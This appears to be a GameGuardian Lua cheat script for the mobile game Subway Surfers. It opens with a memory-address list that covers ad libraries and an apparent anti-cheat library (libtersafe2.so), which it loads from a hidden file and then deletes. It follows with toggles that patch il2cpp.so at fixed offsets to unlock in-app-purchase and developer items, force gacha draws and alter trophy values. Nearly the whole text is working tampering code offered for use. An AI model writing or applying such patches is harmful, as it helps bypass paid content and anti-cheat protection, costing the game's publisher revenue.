7CCA0D74|7cca0d74|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/files/pangle_p/com.bykv.vk/version-4811/lib/libavmdl_lite.so|56d74
7CCA0D9C|7cca0d9c|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/files/pangle_p/com.bykv.vk/version-4811/lib/libavmdl_lite.so|56d9c
7CCA0DCC|7cca0dcc|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/files/pangle_p/com.bykv.vk/version-4811/lib/libavmdl_lite.so|56dcc
7CCA0DF0|7cca0df0|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/files/pangle_p/com.bykv.vk/version-4811/lib/libavmdl_lite.so|56df0
7CCA0E14|7cca0e14|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/files/pangle_p/com.bykv.vk/version-4811/lib/libavmdl_lite.so|56e14
7CCA0E1C|7cca0e1c|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/files/pangle_p/com.bykv.vk/version-4811/lib/libavmdl_lite.so|56e1c
7CCA0E24|7cca0e24|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/files/pangle_p/com.bykv.vk/version-4811/lib/libavmdl_lite.so|56e24
7CCA0E40|7cca0e40|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/files/pangle_p/com.bykv.vk/version-4811/lib/libavmdl_lite.so|56e40
7CCA0E68|7cca0e68|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/files/pangle_p/com.bykv.vk/version-4811/lib/libavmdl_lite.so|56e68
7CCA0E74|7cca0e74|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/files/pangle_p/com.bykv.vk/version-4811/lib/libavmdl_lite.so|56e74
7CCA0E80|7cca0e80|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/files/pangle_p/com.bykv.vk/version-4811/lib/libavmdl_lite.so|56e80
7CCA0EAC|7cca0eac|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/files/pangle_p/com.bykv.vk/version-4811/lib/libavmdl_lite.so|56eac
7CCA0ED8|7cca0ed8|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/files/pangle_p/com.bykv.vk/version-4811/lib/libavmdl_lite.so|56ed8
7CCA0EDC|7cca0edc|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/files/pangle_p/com.bykv.vk/version-4811/lib/libavmdl_lite.so|56edc
7CCA0EE8|7cca0ee8|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/files/pangle_p/com.bykv.vk/version-4811/lib/libavmdl_lite.so|56ee8
800E6DA8|800e6da8|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|4da8
800E6E44|800e6e44|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|4e44
800E6E5C|800e6e5c|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|4e5c
800E6E70|800e6e70|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|4e70
800E6E88|800e6e88|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|4e88
800E6E90|800e6e90|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|4e90
800E6EA8|800e6ea8|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|4ea8
800E6EB8|800e6eb8|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|4eb8
800E6EC0|800e6ec0|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|4ec0
800E6EC8|800e6ec8|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|4ec8
800E6ED0|800e6ed0|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|4ed0
800E6ED4|800e6ed4|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|4ed4
800E6ED8|800e6ed8|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|4ed8
800E6EE0|800e6ee0|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|4ee0
800E6EE8|800e6ee8|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|4ee8
800E6EF0|800e6ef0|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|4ef0
800E6EF8|800e6ef8|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|4ef8
800E6F00|800e6f00|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|4f00
800E6F30|800e6f30|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|4f30
800E6F38|800e6f38|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|4f38
800E6F48|800e6f48|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|4f48
800E6FF8|800e6ff8|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|4ff8
800E7010|800e7010|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|5010
800E7018|800e7018|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|5018
800E7020|800e7020|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|5020
800E7028|800e7028|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|5028
800E7030|800e7030|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|5030
800E7038|800e7038|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|5038
800E7048|800e7048|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|5048
800E704C|800e704c|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|504c
800E70DC|800e70dc|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|50dc
800E70F0|800e70f0|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|50f0
800E7114|800e7114|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|5114
800E7140|800e7140|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so|5140
800ED120|800ed120|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so:bss|120
800ED174|800ed174|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so:bss|174
800ED180|800ed180|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so:bss|180
800ED1A0|800ed1a0|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so:bss|1a0
800ED1D4|800ed1d4|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so:bss|1d4
800ED1E8|800ed1e8|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so:bss|1e8
800ED210|800ed210|4|0|1|0|0|0|rw-p|/data/user/0/com.kiloo.subwaysurf/app_sodler/adLive-v7a/3.6/lib/libaegon.so:bss|210
4453
BC1F0480|bc1f0480|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f480
BC1F04AC|bc1f04ac|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f4ac
BC1F04DC|bc1f04dc|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f4dc
BC1F0508|bc1f0508|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f508
BC1F058C|bc1f058c|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f58c
BC1F05B0|bc1f05b0|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f5b0
BC1F05BC|bc1f05bc|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f5bc
BC1F05CC|bc1f05cc|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f5cc
BC1F0608|bc1f0608|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f608
BC1F0650|bc1f0650|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f650
BC1F066C|bc1f066c|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f66c
BC1F068C|bc1f068c|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f68c
BC1F06CC|bc1f06cc|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f6cc
BC1F0704|bc1f0704|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f704
BC1F0744|bc1f0744|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f744
BC1F0780|bc1f0780|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f780
BC1F0788|bc1f0788|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f788
BC1F07EC|bc1f07ec|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f7ec
BC1F0824|bc1f0824|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f824
BC1F0848|bc1f0848|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f848
BC1F0890|bc1f0890|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f890
BC1F08BC|bc1f08bc|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f8bc
BC1F08D4|bc1f08d4|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f8d4
BC1F08DC|bc1f08dc|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f8dc
BC1F08E8|bc1f08e8|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f8e8
BC1F08FC|bc1f08fc|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f8fc
BC1F0914|bc1f0914|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f914
BC1F0918|bc1f0918|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f918
BC1F0924|bc1f0924|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f924
BC1F0938|bc1f0938|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f938
BC1F0948|bc1f0948|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f948
BC1F095C|bc1f095c|4|0|0|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|f95c
22369
BE190DF4|be190df4|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3fdf4
BE190DF8|be190df8|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3fdf8
BE190DFC|be190dfc|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3fdfc
BE190E14|be190e14|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3fe14
BE190E1C|be190e1c|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3fe1c
BE190E2C|be190e2c|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3fe2c
BE190E34|be190e34|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3fe34
BE190E3C|be190e3c|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3fe3c
BE190E5C|be190e5c|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3fe5c
BE190E64|be190e64|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3fe64
BE190EEC|be190eec|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3feec
BE190F04|be190f04|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3ff04
BE190F34|be190f34|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3ff34
BE190F60|be190f60|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3ff60
BE190F6C|be190f6c|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3ff6c
BE190F90|be190f90|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3ff90
BE190F94|be190f94|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3ff94
BE190F98|be190f98|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3ff98
BE190FC0|be190fc0|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3ffc0
BE190FD4|be190fd4|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3ffd4
BE190FD8|be190fd8|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3ffd8
BE190FDC|be190fdc|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3ffdc
BE190FE0|be190fe0|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3ffe0
BE190FEC|be190fec|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3ffec
BE190FF8|be190ff8|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3fff8
BE190FFC|be190ffc|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|3fffc
BE191000|be191000|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|0
BE191030|be191030|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|30
BE191044|be191044|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|44
BE19104C|be19104c|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|4c
BE191054|be191054|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|54
BE19105C|be19105c|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|5c
BE191064|be191064|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|64
BE19106C|be19106c|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|6c
BE191074|be191074|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|74
BE19107C|be19107c|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|7c
BE191084|be191084|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|84
BE19108C|be19108c|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|8c
BE191094|be191094|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|94
BE1910A0|be1910a0|4|0|1|0|0|0|rw-p|/data/app/~~TG9oOfk2sTyDOeeUJAS8fA==/com.kiloo.subwaysurf--EClQTEIaWq9u2_cqyk2rg==/lib/arm/libtersafe2.so:bss|a0
]])
gg.loadList("/sdcard/.xa",gg.LOAD_VALUES)
os.remove("/sdcard/.xa")
end,
function()
end),







----------------------------------

}, {--第三页
----------------------------------
         
   changan.switch("内购全饰",
			    function()
			    
			local il2cppmod=gg.getRangesList('il2cpp.so')
gg.setValues({{address=il2cppmod[1].start+0x17c1b24,flags=4,value='~A B -0xCB4B9C'}})
gg.setValues({{address=il2cppmod[1].start+0x17c1b24+4,flags=4,value='~A bx lr'}})
				end,
				function()
                
                end),        
             changan.switch("开发者全饰",
			    function()
			    
		local il2cppmod=gg.getRangesList('il2cpp.so')
gg.setValues({{address=il2cppmod[1].start+0x17ac978,flags=4,value='~A B -0xC9F9F0'}})
gg.setValues({{address=il2cppmod[1].start+0x17ac978+4,flags=4,value='~A bx lr'}})
				end,
				function()
                
                end),
               
                   changan.switch("单抽全饰",
			    function()
			    
			    ------宝物单抽人物滑板背饰
	gg.setValues({{address=gg.getRangesList("il2cpp.so")[1].start+0x145e1ac,flags=4,value="2DCED8EAr"}})--单抽
				end,
				function()
                
                end),
      
       
        
          changan.switch("十抽全饰",
         function()
         ByQF(0x1190c4c,4,"~A B	 -0x683CC4")
         gg.alert(os.date'️地铁跑酷提示您:\n秋风:十抽全饰开启成功')

         string.toMusic('十抽全饰开启成功')
         end,
         function()
         end),
         
changan.line(),
changan.line(),
	changan.switch("荣耀之路",
function()
function ms.ss ( num , ty , nc )
	local GGNUMBER_1 = num
	local GGNUMBER_2 = ty
	local GGNUMBER_3 = false
	local GGNUMBER_4 = gg.SIGN_EQUAL
	local GGNUMBER_5 = 0x3000000
	local GGNUMBER_6 = 0xFFFFFFFF
	local GGNUMBER_7 = 0
	gg.clearResults ( )
	gg.setRanges ( nc )
	gg.searchNumber ( GGNUMBER_1 , GGNUMBER_2 , GGNUMBER_3 , GGNUMBER_4 , GGNUMBER_5 , GGNUMBER_6 , GGNUMBER_7 )
	Result = gg.getResults ( gg.getResultCount ( ) )
end

function ms.py ( num , py , ty )
	if ( Result and # Result ~= 0 ) then
		t = { }
		for i , v in ipairs ( Result ) do
			t [ i ] = { } t [ i ].address = v.address + py t [ i ].flags = ty
		end
		t = gg.getValues ( t )
		for i , v in ipairs ( t ) do
			if v.value ~= num then
				Result [ i ] = nil
			end
		end
		local MS = { }
		for i , v in pairs ( Result ) do
			MS [ # MS + 1 ] = v
		end
		Result = MS
	end
end

function ms.bc ( )
	data = { }
	if Result == nil or # Result == 0 then
		gg.alert ( "开启失败" )
	else
		for i , v in pairs ( Result ) do
			data [ # data + 1 ] = v.address
		end
	end
	Result = nil
end

function ms.edit ( nn , off , ty , dj )
	if ( Result ) then
		ms.bc ( )
	end
	if # data > 0 then
		for i , v in ipairs ( data ) do
			setvalue ( v + off , nn , ty , dj or false )
		end
		gg.toast ( Name.."成功" )
	end
end
Name = "奖杯"
	ms.ss ( "2668" , 4 , 32 )
	ms.py ( 1 , 0x24 , 4 )
	ms.py ( 1 , 0x4C , 4 )
	ms.py ( 1 , 0x100 , 4 )
	ms.edit ( 0 , 0x11C , 4 )
	ms.edit ( 0 , 0x110 , 4 )
